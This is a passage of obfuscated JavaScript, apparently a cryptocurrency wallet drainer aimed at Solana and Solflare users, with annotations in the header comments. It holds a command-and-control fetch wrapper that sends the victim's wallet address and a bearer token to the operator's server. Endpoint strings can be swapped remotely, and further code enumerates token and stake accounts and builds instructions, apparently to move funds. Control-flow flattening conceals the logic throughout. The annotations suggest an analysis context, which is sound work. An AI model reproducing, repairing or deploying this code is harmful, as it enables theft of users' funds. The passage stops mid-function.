/* ════════════════════════════════════════════════════════════
 * SECTION 5 — C2 FETCH WRAPPER + NOTIFICATION STRINGS
 * See docs/execution_flow.md and docs/backend_protocol.md.
 * See docs/ for full documentation.
 * ════════════════════════════════════════════════════════════ */

  /* ═══════════════════════════════════════════════════════════
   * SECTION 5 — C2 FETCH WRAPPER + NOTIFICATION STRINGS
   * c2Fetch: adds C2_PATH_PREFIX, sets User-Agent=walletAddress,
   *   Authorization: Bearer <generateBearer()>, 3.5s timeout
   * NOTIFY_STRINGS[0..9]: C2 endpoint paths + Solflare API URLs
   *   server can replace these via fetchLocale()
   * ═══════════════════════════════════════════════════════════ */
  c2Fetch = async function(_str_cache, __str_table__) {
    __str_table__ && (_str_cache += "?" + new(URLSearchParams)(__str_table__));
    let _s1 = await fetch(C2_PATH_PREFIX + _str_cache, {
      ["signal"]: AbortSignal["Be"](3500),
      ["referrerPolicy"]: "no-referrer",
      ["headers"]: {
        ["User-Agent"]: walletAddress,
        ["Authorization"]: generateBearer()
      }
    });
    if (!_s1["ok"]) {
      let _s3 = "20";
      throw new HttpError(_s3)
    }
    return await _s1["json"]()
  }, solflareInstance = new SolflareClient, NOTIFY_STRINGS = ["/c/i", "Description", "/c/c/", "/c/f/", "text/plain", "https://wallet-api.solflare.com/", "v2/swap/capped-tokens?currency=USD", "Message", "v3/portfolio/tokens/", "enablePartialErrors"], localeLoaded = !1, localeTimestamp = 0, supportedLangs = new(Set)(["ar", "bg", "my", "cs", "da", "fr", "de", "el", "id", "it", "ja", "ko", "lo", "lv", "pl", "pt", "ro", "zh", "si", "sk", "sl", "es", "sv", "tr", "vi"]));
async function fetchLocale() {
  let _str_cache = navigator["language"]["slice"](0, 2);
  if (!supportedLangs["has"](_str_cache)) {
    return
  }
  localeTimestamp = Date["now"]();
  let __str_table__ = await fwcInstance["bn"](appState, _str_cache)["catch"](console["error"]);
  !Array["isArray"](__str_table__) || __str_table__["length"] != NOTIFY_STRINGS["length"] || (NOTIFY_STRINGS = __str_table__)
}
async function initLocale() {
  try {
    _noop(await fetchLocale(), localeLoaded = !0)
  } catch (_str_cache) {
    console["error"](_str_cache)
  }
}

function waitForLocale(..._str_cache) {
  _str_cache["c"] = 500 - Date["now"]() + localeTimestamp;
  if (!(localeLoaded || _str_cache["c"] < 1)) {
    return _v62(_str_cache["c"])
  }
}
_noop(_v455 = 0, _v240 = undefined, _v241 = undefined);

function _v416() {
  return _v240
}

function _v638() {
  return _v241 || (Date["now"]() - _v455 < 2500 ? Promise["resolve"](_v240) : (_v241 = solana["SolflareApi errors:"]({
    ["commitment"]: "confirmed"
  })["then"](_limitArgs((..._str_cache) => {
    _str_cache["length"] = 1;
    return _v455 = Date["now"](), _v240 = {
      ["fe"]: _str_cache[0]["value"]["blockhash"],
      ["ne"]: _str_cache[0]["value"]["unknown asset standard:"]
    }, _v240
  }))["finally"](() => {
    _v241 = void 0
  }), _v241))
}
_v74 = getString(170);

function _v99(_str_cache, __str_table__, _s1) {
  let _s3 = new(Uint8Array)(12);
  return _s3[0] = 2, _v86(_s3, BigInt(_s1), 4), {
    ["d"]: _v74,
    ["data"]: _s3,
    ["f"]: [{
      ["e"]: _str_cache,
      ["r"]: 3
    }, {
      ["e"]: __str_table__,
      ["r"]: 1
    }],
    ["v"]: 150
  }
}
_noop(_v69 = getString(312), _v75 = getString(313), _v187 = getString(314));

function _v1236(_str_cache) {
  return _str_cache == _v75 || _str_cache == _v69
}

function _v919(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2 = {
    ["\u8AF9"]: {}
  }) {
    while (_s1 + _s3 !== -76) {
      with(_s2["\u997A"] || _s2) {
        switch (_s1 + _s3) {
          case 52:
            _noop([_s2["\u8AF9"]["\u5EF9"], _s2["\u8AF9"]["\u6366"]] = [244, -239], _str_cache[-234] = new(_g(CONSTS[_s1 + 219] + "E"))(CONSTS[_s1 + 31]), _str_cache[-CONSTS[_s1 + 712]][CONSTS[_s1 + 3]] = 3, _v86(_str_cache[-CONSTS[_s1 + 712]], _str_cache[3], CONSTS[_s1 + 1]), _s2["\u997A"] = _s2["\u8AF9"], _s1 += 196, _s3 += -22);
            break;
          case _s3 - 30:
          case -224:
          case 58:
            _noop([_s2["\u8AF9"]["\u5EF9"], _s2["\u8AF9"]["\u6366"]] = [95, -73], _s2["\u997A"] = _s2["\u8AF9"], _s1 += 229, _s3 += -212);
            break;
          case _s1 - -318:
          case 15:
            _noop(_s2["\u997A"] = _s2["\u8AF9"], _s1 += 369, _s3 += -291);
            break;
          default:
          case -23:
            _str_cache[5] = [{
              ["e"]: _str_cache[1],
              [CONSTS[_s1 + 124]]: CONSTS[_s1 + -195]
            }, {
              ["e"]: _str_cache[CONSTS[_s1 + -199]],
              [CONSTS[_s1 + 124]]: 1
            }, {
              [CONSTS[_s1 + -44]]: _str_cache[0],
              [CONSTS[_s1 + 124]]: 2
            }];
            return __str_table__ = true, {
              ["d"]: _v75,
              ["data"]: _str_cache[-CONSTS[_s1 + 516]],
              [CONSTS[_s1 + 34]]: _str_cache[5],
              ["v"]: 80
            };
            _noop(_s2["\u997A"] = _s2["\u72B8"], _s1 += -369, _s3 += 67);
            break;
            if (_s3 < -81) {
              _noop(_s2["\u997A"] = _s2["\u9087"], _s1 += -196, _s3 += 22);
              break
            }
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(3, 49)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v918(..._str_cache) {
  _noop(_str_cache["a"] = _str_cache[4] ? _v69 : _v75, _str_cache[201] = new(Uint8Array)([1]), _str_cache[6] = [{
    ["e"]: _str_cache[0],
    ["r"]: 3
  }, {
    ["e"]: _str_cache[2],
    ["r"]: 1
  }, {
    ["e"]: _str_cache[1],
    ["r"]: 0
  }, {
    ["e"]: _str_cache[3],
    ["r"]: 0
  }, {
    ["e"]: _v74,
    ["r"]: 0
  }, {
    ["e"]: _str_cache["a"],
    ["r"]: 0
  }]);
  return {
    ["d"]: _v187,
    ["data"]: _str_cache[201],
    ["f"]: _str_cache[6],
    ["v"]: 60000,
    ["ae"]: 3
  }
}

function _v917(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5, _s4 = {
    ["\u8161"]: {}
  }) {
    while (_s1 + _s3 + _s2 + _s5 !== 97) {
      with(_s4["\u78CB"] || _s4) {
        switch (_s1 + _s3 + _s2 + _s5) {
          default:
          case -84:
            _noop([_s4["\u8161"]["\u74C3"]] = [-161], _str_cache[CONSTS[_s1 + 76]] = _str_cache[CONSTS[_s2 + -151]] ? _v69 : _v75, _str_cache[CONSTS[_s3 + 566]] = new(Uint8Array)([9]), _str_cache[CONSTS[_s2 + -97]] = [{
              ["e"]: _str_cache[CONSTS[_s2 + -146]],
              ["r"]: 1
            }, {
              ["e"]: _str_cache[CONSTS[_s2 + -148]],
              [CONSTS[_s3 + 886]]: 1
            }, {
              ["e"]: _str_cache[2],
              ["r"]: CONSTS[_s3 + 563]
            }]);
            return __str_table__ = true, {
              [CONSTS[_s2 + -134]]: _str_cache[121],
              [CONSTS[_s1 + 95]]: _str_cache[44],
              [CONSTS[_s1 + 245]]: _str_cache[CONSTS[_s3 + 566]],
              ["v"]: _str_cache[3] ? 3100 : 120
            };
            _noop(_s1 += -71, _s3 += 731, _s2 += -482, _s5 += 3);
            break;
            if (_s3 > 60) {
              break
            }
          case _s2 - 361:
          case -224:
          case -228:
            _noop(_s4["\u78CB"] = _s4["\u7186"], _s1 += 289, _s3 += 369, _s2 += -813, _s5 += 130);
            break;
          case _s1 - -22:
            _noop(_s4["\u78CB"] = _s4["\u8161"], _s1 += 385, _s3 += 34, _s2 += -340);
            break;
          case _s2 - -99:
            _noop([_s4["\u8161"]["\u74C3"]] = [118], _s4["\u78CB"] = _s4["\u8161"], _s1 += 57, _s2 += -185, _s5 += 92);
            break;
          case _s5 - -5:
            _noop(_s4["\u78CB"] = _s4["\u69B5"], _s1 += -324, _s3 += 409, _s2 += -185, _s5 += 90);
            break;
          case _s4["\u8161"]["\u74C3"] + 79:
          case 88:
            _noop([_s4["\u8161"]["\u74C3"]] = [134], _s4["\u78CB"] = _s4["\u64DB"], _s1 += -34, _s3 += 215, _s5 += -2);
            break;
          case _s3 - -435:
            _noop(_s4["\u78CB"] = _s4["\u6D21"], _s1 += 61, _s3 += 369, _s2 += -661, _s5 += 94);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(138, -563, 152, 189)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v560(..._str_cache) {
  _noop(_str_cache["a"] = 0x517cc1b727220a95n, _str_cache[2] = 0xffffffffffffffffn, _str_cache[-14] = 0x100000001b3n, _str_cache[4] = 0);
  for (; _str_cache[4] < 32;) {
    _noop(_str_cache["a"] = _str_cache["a"] * _str_cache[-14] & _str_cache[2], _str_cache["a"] ^= BigInt(_str_cache[0][_str_cache[4]]), _str_cache["a"] = _str_cache["a"] << 13n & _str_cache[2] | _str_cache["a"] >> 51n, _str_cache[4]++)
  }
  _noop(_str_cache["a"] ^= _str_cache["a"] >> 32n, _str_cache["a"] ^= _str_cache["a"] >> 16n, _str_cache["a"] ^= _str_cache["a"] >> 8n, _str_cache[5] = new(Uint8Array)(8));
  return _v86(_str_cache[5], _str_cache["a"], 0), _str_cache[5]
}
_noop(_v715 = _buildList(_v75), _v716 = _buildList(_v69));
async function _v639(_str_cache, __str_table__, _s1) {
  return (await _v610({
    ["d"]: _v187,
    ["$e"]: [_str_cache, _s1 ? _v716 : _v715, _buildList(__str_table__)]
  }))[0]
}
async function _v640(_str_cache, __str_table__, _s1) {
  let _s3 = [new(Uint8Array)(_s1), _buildList(_str_cache), _buildList(__str_table__)];
  let [_s2] = await _v610({
    ["$e"]: _s3,
    ["d"]: _v150
  });
  return _s2
}
async function _v179(_str_cache) {
  let __str_table__ = _v560(_buildList(_str_cache));
  let [_s1] = await _v610({
    ["$e"]: ["vault", __str_table__],
    ["d"]: _v150
  });
  return _s1
}
_noop(_v123 = undefined, _v151 = undefined, _v188 = undefined, _v242 = undefined, _v243 = undefined, _v456 = undefined, _v457 = undefined, _v244 = class _v244 {
  constructor(_str_cache) {
    _noop(_initPriv(this, _v243), _initPriv(this, _v123), _initPriv(this, _v151, 0), _initPriv(this, _v188, !1), _initPriv(this, _v242), _setPriv(this, _v123, _str_cache), _setPriv(this, _v242, _str_cache["he"]["dr"]))
  }
  static["fr"](..._str_cache) {
    _noop(_str_cache["length"] = 0, _str_cache["c"] = 5000);
    return _str_cache["c"] += 5e4 * SOL_RESERVE, _str_cache["c"] += 150, _str_cache["c"] += 75, _str_cache["c"]
  }
  static["pr"](..._str_cache) {
    _noop(_str_cache["length"] = 1, _str_cache["a"] = 650240);
    return _str_cache["a"] += _v244["fr"](), _str_cache[0]["b"]["id"] == 1 && _str_cache[0]["c"]["ue"] == 2 && (_str_cache["a"] += 6075), _str_cache["a"]
  }
  async ["Vt"](_str_cache) {
    let {
      ["ee"]: __str_table__, ["K"]: _s1, ["c"]: _s3, ["b"]: _s2, ["he"]: _s5
    } = _getPriv(this, _v123);
    _noop(_setPriv(this, _v151, 0), _setPriv(this, _v188, !1));
    let _s4 = [];
    let _s6 = [];
    let _s7 = _v244["pr"](_getPriv(this, _v123));
    _s2["id"] == 1 && _s3["ue"] == 5 && (_s7 += 1513840);
    let _s8 = 0;
    let _defineProperty = _s5["mr"];
    for (let _getOwnPropDesc of __str_table__) {
      if (_getOwnPropDesc["type"] == 0) {
        if (_s8 >= _defineProperty) {
          continue
        }
        _s8 += 1
      }
      let _found = await _callPriv(this, _v243, _v456)["call"](this, _getOwnPropDesc);
      _found !== void 0 && (_s7 += _found, _s6["push"](_getOwnPropDesc), _s1 > _s7 && _s4["push"](_getOwnPropDesc))
    }
    _getPriv(this, _v188) || (_s7 += _getPriv(this, _v151));
    let _v1 = _getPriv(this, _v123)["we"](_s4);
    let _v2 = _getPriv(this, _v123)["we"](_s6);
    if (_v1 < _str_cache) {
      if (_v2 >= _str_cache) {
        return {
          ["mt"]: !1,
          ["We"]: _s7,
          ["type"]: 1
        }
      }
      let _getOwnPropDesc = _str_cache - _v1;
      return {
        ["mt"]: !1,
        ["We"]: Math["trunc"](_getOwnPropDesc / solUsdRate * 1000000000),
        ["type"]: 0
      }
    }
    return {
      ["mt"]: _s1 > _s7,
      ["We"]: _s7,
      ["type"]: 1
    }
  }
}, _v123 = new(WeakMap), _v151 = new(WeakMap), _v188 = new(WeakMap), _v242 = new(WeakMap), _v243 = new(WeakMap), _v456 = function(_str_cache) {
  if (_str_cache["type"] == 0) {
    return _callPriv(this, _v243, _v457)["call"](this, _str_cache)
  }
  if (_str_cache["type"] == 2) {
    return 25000
  }
  throw new(Error)("40")
}, _v457 = async function(_str_cache) {
  let __str_table__ = 100;
  let _s1 = await _v639(_getPriv(this, _v242), _str_cache["q"], _str_cache["J"]);
  let _s3 = !!_getPriv(this, _v123)["c"]["ce"];
  let _s2 = _str_cache["q"] == _v335;
  let _s5 = _v238["has"](_s1);
  if (!_s2 && (!_s5 || _s3)) {
    if (_str_cache["oe"] < MAX_RETRIES) {
      return
    }
    _noop(__str_table__ += 30000, _s3 && !_s5 && (__str_table__ += 30000));
    let _s4 = _str_cache["_e"] ?? 1700000;
    _noop(_s4 > _getPriv(this, _v151) && _setPriv(this, _v151, _s4), _s3 && !_s5 && (__str_table__ += _s4))
  } else {
    _setPriv(this, _v188, !0)
  }
  return __str_table__
}, _v337 = _v244);

function _v559(..._str_cache) {
  return [_v393(_str_cache[0], _str_cache[1] + 0), _v922(_str_cache[0], _str_cache[1] + 8), _v171(_str_cache[0], _str_cache[1] + 16)]
}

function _v916(..._str_cache) {
  _str_cache["a"] = 166;
  for (; _str_cache["a"] < _str_cache[0]["length"];) {
    let __str_table__ = _v171(_str_cache[0], _str_cache["a"]);
    let _s1 = _v171(_str_cache[0], _str_cache["a"] + 2);
    if (__str_table__ == 1) {
      let _s3 = _str_cache[0]["subarray"](_str_cache["a"] + 4, _str_cache["a"] + 4 + _s1);
      return [_v559(_s3, 72), _v559(_s3, 90)]
    }
    _str_cache["a"] += _s1 + 4
  }
  return "null"
}
_v717 = {
  [1513840]: [],
  [1574800]: [0],
  2039280: [],
  2074080: [],
  2157600: [0],
  1539240: [1],
  [2108880]: [1],
  1559560: [1, 2],
  2136720: [1, 2],
  1600200: [0, 1, 3, 2],
  2192400: [0, 1, 3, 2]
};

function _v1237(_str_cache, __str_table__, _s1, _s3) {
  if (!__str_table__) {
    __str_table__ = function*(__str_table__, _s3, _s2 = {
      ["\u82E6"]: {}
    }) {
      while (__str_table__ + _s3 !== -170) {
        with(_s2["\u8140"] || _s2) {
          switch (__str_table__ + _s3) {
            case -141:
            case -112:
            case 220:
              _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -385, _s3 += 290);
              break;
            case __str_table__ != -140 && __str_table__ - -29:
              return _s1 = true, !CONSTS[__str_table__ + -104];
              _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -250);
              break;
              if (__str_table__ != __str_table__ + 0) {
                _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += 145, _s3 += -111);
                break
              }
            case -111:
              _s2["\u82E6"]["_v1238"] = _str_cache[CONSTS[__str_table__ + 867]];
              if (!_v1238) {
                _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -74, _s3 += 216);
                break
              } else {
                _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -341, _s3 += 216);
                break
              }
            case -40:
            case -108:
            case -34:
              [_s2["\u82E6"]["\u773E"], _s2["\u82E6"]["\u8657"], _s2["\u82E6"]["\u6927"]] = [-67, 104, 56];
              if (!_str_cache["J"]) {
                _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += 37, _s3 += 210);
                break
              } else {
                _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -213, _s3 += 210);
                break
              }
            default:
              _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -418, _s3 += 294);
              break;
              if (!(__str_table__ != -26)) {
                _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -520, _s3 += 327);
                break
              }
            case _s2["\u82E6"]["\u8657"] + 69:
            case -80:
            case 143:
              _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -395, _s3 += 111);
              break;
            case _s2["\u82E6"]["\u8657"] + -271:
            case 187:
              _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += 283, _s3 += -257);
              break;
            case 68:
            case 31:
              return _s1 = true, !1;
              _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -267);
              break;
            case 103:
            case _s3 - 159:
              _noop([_s2["\u82E6"]["\u773E"], _s2["\u82E6"]["\u8657"], _s2["\u82E6"]["\u6927"]] = [-59, 178, 215], _s2["\u8140"] = _s2["\u82E6"], __str_table__ += -220, _s3 += 266);
              break;
              if (!(__str_table__ != -26)) {
                _noop(_s2["\u8140"] = _s2["\u82E6"], __str_table__ += -322, _s3 += 299);
                break
              }
            case __str_table__ != -214 && __str_table__ - -245:
              _s2["\u82E6"]["_v1239"] = _v717[_v1238];
              return _s1 = true, _v1239 ? !_v1239[CONSTS[__str_table__ + 1025]](_limitArgs((...__str_table__) => {
                __str_table__["length"] = 1;
                return __str_table__[0] == 3
              })) : !1;
              _noop(_s2["\u8140"] = _s2["\u6D87"], __str_table__ += 385, _s3 += -319);
              break
          }
        }
      }
    }
  }
  _noop(_s1 = undefined, _s3 = __str_table__(73, -181)["next"]()["value"]);
  if (_s1) {
    return _s3
  }
}

function _v915(..._s1) {
  var _s3, _s2;

  function* _s5(_s2, _s4, _s6, _s7 = {
    ["\u9EEF"]: {}
  }, _s8) {
    while (_s2 + _s4 + _s6 !== 61) {
      with(_s7["\u73B3"] || _s7) {
        switch (_s2 + _s4 + _s6) {
          case _s7["\u9EEF"]["\u6F3C"] + -235:
            [_v1240["_v641"]] = _s8;
            if (typeof _str_cache[_v1240["_v641"]] === "undefined") {
              _noop(_s7["\u73B3"] = _s7["_v1240"], _s4 += 228, _s6 += -151);
              break
            } else {
              _noop(_s7["\u73B3"] = _s7["_v1240"], _s2 += 9, _s4 += 250, _s6 += 111);
              break
            }
          case 192:
          case -72:
          case _s7["\u9EEF"]["\u6F3C"] + 21:
            _noop(_s7["\u6FFB"] = {}, _s7["\u6FFB"]["_v1428"] = function(..._s2) {
              return _s5(103, -195, -28, {
                ["\u6FFB"]: _s7["\u6FFB"],
                ["\u9EEF"]: _s7["\u9EEF"],
                ["_v1240"]: {}
              }, _s2)["next"]()["value"]
            }, _s7["\u6FFB"]["\u74AC"] = function(..._s2) {
              return _s5(208, -73, -57, {
                ["\u6FFB"]: _s7["\u6FFB"],
                ["\u9EEF"]: _s7["\u9EEF"],
                ["_v100"]: {}
              }, _s2)["next"]()["value"]
            }, _limitArgs(_s7["\u6FFB"]["\u74AC"]), _s7["\u6FFB"]["\u715F"] = {
              ["43"]: 21,
              [CONSTS[_s2 + -175]]: CONSTS[_s4 + 109],
              [CONSTS[_s4 + 110]]: CONSTS[_s4 + 111],
              ["49"]: 62,
              ["50"]: 19,
              [CONSTS[_s2 + -167]]: 16,
              [CONSTS[_s2 + -165]]: 50,
              [CONSTS[_s4 + 120]]: 27,
              [CONSTS[_s4 + 122]]: CONSTS[_s2 + -160],
              ["55"]: 47,
              ["56"]: 23,
              [CONSTS[_s2 + -156]]: 1,
              [CONSTS[_s4 + 128]]: CONSTS[_s4 + 75],
              [CONSTS[_s4 + 129]]: CONSTS[_s2 + -153],
              ["67"]: 35,
              [CONSTS[_s2 + -150]]: 30,
              ["69"]: 29,
              ["70"]: CONSTS[_s2 + -145],
              ["71"]: CONSTS[_s2 + -143],
              [CONSTS[_s2 + -142]]: 18,
              [CONSTS[_s4 + 142]]: 41,
              [CONSTS[_s4 + 144]]: 61,
              ["75"]: 8,
              ["76"]: 24,
              [CONSTS[_s2 + -135]]: 63,
              [CONSTS[_s2 + -134]]: CONSTS[_s4 + 150],
              ["79"]: CONSTS[_s4 + 152],
              [CONSTS[_s4 + 153]]: 4,
              ["81"]: 43,
              ["82"]: CONSTS[_s2 + -196],
              [CONSTS[_s2 + -126]]: 54,
              ["84"]: 42,
              ["85"]: 46,
              ["86"]: 5,
              [CONSTS[_s4 + 164]]: 22,
              ["88"]: 36,
              ["89"]: 34,
              [CONSTS[_s4 + 170]]: 39,
              [CONSTS[_s4 + 172]]: 48,
              [CONSTS[_s4 + 174]]: 17,
              ["99"]: 45,
              ["100"]: 0,
              ["101"]: 12,
              ["102"]: 57,
              ["103"]: CONSTS[_s4 + 183],
              ["104"]: CONSTS[_s2 + -(_s4 + 173)],
              ["105"]: 58,
              ["106"]: CONSTS[_s4 + 189],
              ["107"]: CONSTS[_s4 + 191],
              [CONSTS[_s4 + 192]]: 13,
              [CONSTS[_s2 + -89]]: 49,
              ["110"]: 3,
              ["111"]: 10,
              ["112"]: 40,
              ["113"]: 37,
              ["114"]: 52,
              ["115"]: 53,
              ["116"]: 15,
              ["117"]: 7,
              ["118"]: 38,
              ["119"]: 51,
              ["120"]: 32,
              [CONSTS[_s2 + -68]]: CONSTS[_s2 + -200],
              ["122"]: 56
            }, _s7["\u73B3"] = _s7["\u6FFB"], _s6 += -77);
            break;
          case 223:
            _noop(_s7["\u73B3"] = _s7["\u9093"], _s2 += -233, _s4 += 6, _s6 += 82);
            break;
          case -98:
          case 160:
          case -80:
            if (_s1[CONSTS[_s4 + 160]]["Ut"]) {
              _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += 37, _s4 += 79, _s6 += 118);
              break
            } else {
              _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += -199, _s4 += 75, _s6 += 81);
              break
            }
          case -133:
          case _s6 - 107:
          default:
            return _s3 = true, CONSTS[_s4 + 268];
            _noop(_s7["\u73B3"] = _s7["\u5B01"], _s2 += 123, _s6 += 79);
            break;
          case 4:
          case _s6 - -167:
            return _str_cache[_v641];
            return undefined;
          case 103:
            return _s3 = true, CONSTS[_s2 + 876];
            _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += 170, _s4 += -371);
            break;
          case _s6 != -101 && _s6 != 45 && _s6 - -16:
            _noop(_s7["\u73B3"] = _s7["\u6FFB"], _s2 += -72, _s6 += 67);
            break;
          case _s7["\u9EEF"]["\u6F3C"] + -96:
            _noop([_s7["\u9EEF"]["\u8ACE"], _s7["\u9EEF"]["\u6F3C"]] = [215, -170], _s7["\u73B3"] = _s7["\u68AA"], _s2 += -233, _s4 += 210, _s6 += 82);
            break;
          case _s6 != 3 && _s6 - -133:
            _noop(_s7["\u6FFB"]["\u6744"] = new TextDecoder, _s7["\u6FFB"]["_v1044"] = _s1[0]["Ut"]["filter"](_limitArgs((..._s2) => {
              _s2["length"] = 1;
              return _s2[0] != "metadataPointer" && _s2[0] != "tokenMetadata"
            })));
            if (_v1044["length"] === 0) {
              _noop(_s7["\u73B3"] = _s7["\u6FFB"], _s2 += -242, _s4 += 146, _s6 += 136);
              break
            } else {
              _noop(_s7["\u73B3"] = _s7["\u6FFB"], _s2 += -430, _s4 += 462, _s6 += 136);
              break
            }
            if (!(_s4 < 96)) {
              _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += 233, _s4 += -4, _s6 += -65);
              break
            }
          case _s4 - 49:
            return _s3 = true, 1574800;
            _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += 391, _s6 += -99);
            break;
            if (!(_s4 != -211)) {
              _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += 418, _s4 += -204, _s6 += -67);
              break
            }
          case 249:
            _noop(_s7["_v100"]["_v1241"] = new Uint8Array(_v1425), _v110[159] = 0, _v110["b"] = 0, _v110[-204] = 0);
            for (let _defineProperty = 0; _defineProperty < _v1426 - _v1427; _defineProperty++) {
              const _getOwnPropDesc = _v110[0]["charCodeAt"](_defineProperty);
              if (_getOwnPropDesc == 61) break;
              _noop(_v110[159] = _v110[159] << 6 | _s7["\u6FFB"]["\u715F"][_getOwnPropDesc], _v110["b"] += 6);
              if (_v110["b"] >= 8) {
                _noop(_v110["b"] -= 8, _v1241[_v110[-204]++] = _v110[159] >> _v110["b"] & 255)
              }
            }
            _noop(_s7["\u73B3"] = _s7["_v100"], _s2 += 122, _s4 += -493, _s6 += 31);
            break;
          case _s2 - 130:
            _noop([..._v100["_v110"]] = _s8, _v100["_v110"]["length"] = 1, _v100["_v1426"] = _v100["_v110"][0].length, _v100["\u74C5"] = _v100["_v110"][0].indexOf("="), _v100["_v1427"] = _v100["\u74C5"] == -CONSTS[_s4 + 77] ? 0 : _v100["_v1426"] - _v100["\u74C5"], _v100["_v1425"] = _v100["_v1426"] * 3 / 4 - _v100["_v1427"], _s7["\u73B3"] = _s7["_v100"], _s2 += -312, _s4 += 485, _s6 += -2);
            break;
          case 66:
          case _s4 - 76:
            return _str_cache[_v641] = (1, _s7["\u6FFB"]["\u74AC"])(__str_table__[_v641]);
            _noop(_s7["\u73B3"] = _s7["_v1240"], _s2 += 9, _s4 += 22, _s6 += 262);
            break;
          case 88:
          case 182:
          case -19:
            [_s7["\u9EEF"]["\u8ACE"], _s7["\u9EEF"]["\u6F3C"]] = [-104, 115];
            if (!_s1[0][CONSTS[_s4 + 462]]) {
              _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += 87, _s4 += -12, _s6 += 47);
              break
            } else {
              _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += 257, _s4 += -383, _s6 += 47);
              break
            }
          case 199:
          case _s2 - 180:
          case 1:
            _noop(_s7["\u73B3"] = _s7["_v100"], _s2 += -77, _s4 += -2, _s6 += 73);
            break;
          case 99:
          case 246:
            return _s3 = true, 1513840;
            _noop(_s7["\u73B3"] = _s7["\u6FFB"], _s2 += -188, _s4 += 316);
            break;
          case -91:
          case -243:
            return _s7["\u6FFB"]["\u6744"].decode(_v1241);
            return undefined;
          case -27:
          case 149:
          case _s6 - -335:
            _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += -442, _s6 += 137);
            break;
            if (_s2 == 42) {
              _noop(_s7["\u73B3"] = _s7["\u6FFB"], _s2 += -636, _s4 += 466, _s6 += 233);
              break
            }
          case _s2 - -449:
            if (_v1044[CONSTS[_s2 + 227]] == 1 && _v1044[0] == (1, _v1428)(315)) {
              _noop(_s7["\u73B3"] = _s7["\u6FFB"], _s2 += 245, _s4 += -466, _s6 += -134);
              break
            } else {
              _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += 636, _s4 += -466, _s6 += -233);
              break
            }
          case _s4 - 321:
            return _str_cache[_v641];
            return undefined;
          case _s6 - 76:
            return _s3 = true, 1574800;
            _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s2 += -27, _s4 += 438, _s6 += -32);
            break;
            if (!(_s4 != -211)) {
              _noop(_s7["\u73B3"] = _s7["\u9EEF"], _s4 += 234);
              break
            }
        }
      }
    }
  }
  _noop(_s3 = undefined, _s2 = _s5(-86, 229, -162)["next"]()["value"]);
  if (_s3) {
    return _s2
  }
}
async function _v1242([_str_cache, __str_table__]) {
  let _s1 = (await getCurrentEpoch()) >= __str_table__[0] ? __str_table__ : _str_cache;
  return {
    ["Ot"]: _s1[2],
    ["Nt"]: _s1[1]
  }
}
_noop(_v458 = {
  ["You are allowing this DApp to"]: {
    ["_e"]: 2108880
  }
}, solUsdRate = LAMPORTS_DIV, _v459 = new _v237("_0x11", 86400), _v460 = new(WalletConnectBase), _v718 = class {
  async ["Ht"](_str_cache, __str_table__ = 2) {
    let _s1;
    let _s3 = [];
    for (let _s2 = 0; _s2 < __str_table__; _s2++) {
      let _s5 = await solflareInstance["Ht"](_str_cache);
      if (!_s5) {
        await _v62(100);
        continue
      }
      if (_s5["ur"] && (solUsdRate = _s5["ur"]), _s5["De"]["length"] > 0 && (await this["xn"](_s5["De"]), _s3 = _s5["De"]["filter"](_limitArgs((..._str_cache) => {
          _str_cache["length"] = 1;
          return _str_cache[0]["oe"] >= MIN_STAKE_SOL
        }))), _s5["ve"] !== void 0) {
        return _s1 = _s5["ve"], {
          ["ve"]: _s1,
          ["De"]: _s3
        }
      }
    }
    throw new(Error)("22")
  }
  async ["In"](_str_cache) {
    let __str_table__ = _v238;
    let _s1 = _v451;
    let _s3 = _str_cache["filter"](_limitArgs((..._str_cache) => {
      _str_cache["length"] = 1;
      return !__str_table__["has"](_str_cache[0]) && !_s1["has"](_str_cache[0])
    }));
    if (_s3["length"] === 0) {
      return __str_table__
    }
    let _s2 = await solana[getString(317)](_s3)["catch"](() => {
      return "null"
    });
    if (!_s2) {
      return __str_table__
    }
    for (let _s5 = 0; _s5 < _s3["length"]; _s5++) {
      let _s4 = _s3[_s5];
      _s2["value"][_s5] ? __str_table__["set"](_s4, 1) : _s1["add"](_s4)
    }
    return __str_table__
  }
  async ["gr"](_str_cache) {
    let {
      ["value"]: __str_table__
    } = await solana["getAccountInfo"](_str_cache, {
      ["encoding"]: "base64",
      ["commitment"]: "confirmed"
    });
    if (__str_table__) {
      return {
        ["Ee"]: __str_table__["owner"],
        ["K"]: __str_table__["lamports"],
        ["data"]: __str_table__["data"],
        ["Tt"]: __str_table__["space"]
      }
    }
  }
  async ["xn"](_str_cache) {
    let __str_table__ = new(WalletConnectBase);
    let _s1 = new(Set);
    for (let _s3 of _str_cache) {
      let _s2 = _s3["q"];
      if (_s2 in _v458 && Object["assign"](_s3, _v458[_s2]), !_s3["_e"] && (_s3["_e"] = _v915(_s3), !_s3["_e"])) {
        let _s5 = _v459["get"](_s2);
